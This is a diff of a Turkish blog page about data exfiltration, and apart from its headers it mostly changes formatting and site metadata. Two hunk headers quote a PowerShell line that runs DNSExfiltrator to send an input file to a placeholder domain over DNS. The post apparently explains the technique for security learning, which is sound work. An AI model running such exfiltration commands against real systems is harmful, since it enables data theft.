@@ -1,50 +1,69 @@
 <!DOCTYPE html>
 <html lang="tr">
+
 <head>
-        <title>Data Exfiltration</title>
-        <meta charset="utf-8" />
+  <title>Data Exfiltration</title>
+  <meta charset="utf-8" />
+  <meta name="description"
+    content="Profesyonel veya hobi hayatımda kullandığım teknolojiler hakkında çeşitli içerikler üretip kendime ait bir not defteri olarak kullandığım blog sayfam. Arada sırada boş muhabbet yaptığımda olur. "
+    \>
 
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
-        <meta name="viewport" content="width=device-width, initial-scale=1" />
-        <!-- Social -->
-    <meta property="article:author" content="0x656e" />
-    <meta property="article:section" content="siber güvenlik" />
-    <meta property="article:published_time" content="2018-11-11" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <!-- Social -->
+  <meta property="article:author" content="0x656e" />
+  <meta property="article:section" content="siber güvenlik" />
+  <meta property="article:published_time" content="2018-11-11" />
 
-    <meta property="og:type" content="article"/>
-    <meta property="og:title" content="Data Exfiltration"/>
-    <meta property="og:description" content="Data Exfiltration Nedir? Bir kişi veya grubun yetkisiz bir biçimde bir veriyi başka bir bilgisayar yada sunucuya kopyalaması, transfer etmesi anlamına gelir. Data extrusion(veri çıkarma), data exportation(veri ihracati!), data theft(veri hırsızlığı) olarak da bilinir. Örnek vermek gerekirse bir banka çalışanının bankaya ait verileri bir USB(!) içerisinde dışarıya …"/>
-    <meta property="og:site_name" content="Enes Ergün | Junior of All" />
-    <meta property="og:url" content="https://enesergun.net/data-exfiltration.html"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="Data Exfiltration" />
+  <meta property="og:description" content="Data Exfiltration Nedir? Bir kişi veya grubun yetkisiz bir biçimde bir veriyi başka bir bilgisayar yada sunucuya kopyalaması, transfer etmesi anlamına gelir. Data extrusion(veri çıkarma), data exportation(veri ihracati!), data theft(veri hırsızlığı) olarak da bilinir. Örnek vermek gerekirse bir banka çalışanının bankaya ait verileri bir USB(!) içerisinde dışarıya …" />
+  <meta property="og:site_name" content="Enes Ergün | Personel Homepage about of my Profession | Python, Cyber Security, Linux" />
+  <meta property="og:url" content="https://enesergun.net/data-exfiltration.html" />
 
-    <meta name="twitter:card" content="summary">
-    <meta name="twitter:title" content="Data Exfiltration">
-    <meta name="twitter:description" content="Data Exfiltration Nedir? Bir kişi veya grubun yetkisiz bir biçimde bir veriyi başka bir bilgisayar yada sunucuya kopyalaması, transfer etmesi anlamına gelir. Data extrusion(veri çıkarma), data exportation(veri ihracati!), data theft(veri hırsızlığı) olarak da bilinir. Örnek vermek gerekirse bir banka çalışanının bankaya ait verileri bir USB(!) içerisinde dışarıya …">
-    <meta name="twitter:url" content="https://enesergun.net/data-exfiltration.html">
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css" />
-        <link rel="stylesheet" href="https://enesergun.net/theme/css/grids-responsive-min.css" />
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css" />
-        <link rel="stylesheet" href="https://enesergun.net/theme/css/main.css" />
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Data Exfiltration">
+  <meta name="twitter:description" content="Data Exfiltration Nedir? Bir kişi veya grubun yetkisiz bir biçimde bir veriyi başka bir bilgisayar yada sunucuya kopyalaması, transfer etmesi anlamına gelir. Data extrusion(veri çıkarma), data exportation(veri ihracati!), data theft(veri hırsızlığı) olarak da bilinir. Örnek vermek gerekirse bir banka çalışanının bankaya ait verileri bir USB(!) içerisinde dışarıya …">
+  <meta name="twitter:url" content="https://enesergun.net/data-exfiltration.html">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css" />
+  <link rel="stylesheet" href="https://enesergun.net/theme/css/grids-responsive-min.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css" />
+  <link rel="stylesheet" href="https://enesergun.net/theme/css/main.css" />
 </head>
+
 <body>
 
-    <div class="w3-row w3-card w3-white">
-        <header id="header">
-          <a href="https://enesergun.net" id="header-logo" title="Home">0x656e</a>
-          <nav id="header-menu">
-            <ul>
-              <li class="w3-bottombar w3-border-white w3-hover-border-green" ><a href="https://enesergun.net/category/ansible.html">ansible</a></li>
-              <li class="w3-bottombar w3-border-white w3-hover-border-green" ><a href="https://enesergun.net/category/flask.html">flask</a></li>
-              <li class="w3-bottombar w3-border-white w3-hover-border-green" ><a href="https://enesergun.net/category/iot-elektronik.html">iot & elektronik</a></li>
-              <li class="w3-bottombar w3-border-white w3-hover-border-green" ><a href="https://enesergun.net/category/linux.html">linux</a></li>
-              <li class="w3-bottombar w3-border-white w3-hover-border-green" ><a href="https://enesergun.net/category/python.html">python</a></li>
-              <li class="w3-bottombar w3-border-white w3-hover-border-green" style="font-weight: bold;"><a href="https://enesergun.net/category/siber-guvenlik.html">siber güvenlik</a></li>
-              <li class="w3-bottombar w3-border-white w3-hover-border-green" ><a href="https://enesergun.net/category/vagrant.html">vagrant</a></li>
-            </ul>
-          </nav>
-        </header>
-      </div>
+  <div class="w3-row w3-card w3-white">
+    <header id="header">
+      <a href="https://enesergun.net" id="header-logo" title="Home">0x656e</a>
+      <nav id="header-menu">
+        <ul>
+            <li class="w3-bottombar w3-border-white w3-hover-border-green"
+><a
+                href="https://enesergun.net/category/ansible.html">ansible</a></li>
+            <li class="w3-bottombar w3-border-white w3-hover-border-green"
+><a
+                href="https://enesergun.net/category/flask.html">flask</a></li>
+            <li class="w3-bottombar w3-border-white w3-hover-border-green"
+><a
+                href="https://enesergun.net/category/iot-elektronik.html">iot & elektronik</a></li>
+            <li class="w3-bottombar w3-border-white w3-hover-border-green"
+><a
+                href="https://enesergun.net/category/linux.html">linux</a></li>
+            <li class="w3-bottombar w3-border-white w3-hover-border-green"
+><a
+                href="https://enesergun.net/category/python.html">python</a></li>
+            <li class="w3-bottombar w3-border-white w3-hover-border-green"
+style="font-weight: bold;" ><a
+                href="https://enesergun.net/category/siber-guvenlik.html">siber güvenlik</a></li>
+            <li class="w3-bottombar w3-border-white w3-hover-border-green"
+><a
+                href="https://enesergun.net/category/vagrant.html">vagrant</a></li>
+        </ul>
+      </nav>
+    </header>
+  </div>
 
 
 <div class="page-container">
@@ -176,20 +195,20 @@ PS c:\DNSExfiltrator&gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p p
 
 
 
-    <footer class="index-footer">
+  <footer class="index-footer">
 
-        <a href="https://enesergun.net/" title="Enes Ergün | Junior of All">Enes Ergün | Junior of All</a>
-        <a href="https://mertcangokgoz.com/">Mertcan Gökgöz</a>
-        <a href="https://onur.im/">Onur Aslan</a>
-        <a href="http://www.omeripek.com.tr/">Ömer İpek</a>
-        <a href="https://canyoupwn.me/">Canyoupwn.me</a>
-        <a href="http://www.oguzozkeroglu.com">Oğuz Özkeroğlu</a>
-        <a href="http://ahmetgurel.com">Ahmet Gürel</a>
-        <a href="https://berkimran.com.tr">Berk İmran</a>
-        <a href="https://aligoren.com">Ali Gören</a>
-        <a href="https://0xf61.gitlab.io/">Emir Kurt</a>
+    <a href="https://enesergun.net/" title="Enes Ergün | Personel Homepage about of my Profession | Python, Cyber Security, Linux">Enes Ergün | Personel Homepage about of my Profession | Python, Cyber Security, Linux</a>
+    <a href="https://mertcangokgoz.com/">Mertcan Gökgöz</a>
+    <a href="https://onur.im/">Onur Aslan</a>
+    <a href="http://www.omeripek.com.tr/">Ömer İpek</a>
+    <a href="https://canyoupwn.me/">Canyoupwn.me</a>
+    <a href="http://www.oguzozkeroglu.com">Oğuz Özkeroğlu</a>
+    <a href="http://ahmetgurel.com">Ahmet Gürel</a>
+    <a href="https://berkimran.com.tr">Berk İmran</a>
+    <a href="https://aligoren.com">Ali Gören</a>
+    <a href="https://0xf61.gitlab.io/">Emir Kurt</a>
 
-    </footer>
+  </footer>
 
     <script>
       (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
@@ -202,4 +221,5 @@ PS c:\DNSExfiltrator&gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p p
 
     </script>
 </body>
+
 </html>
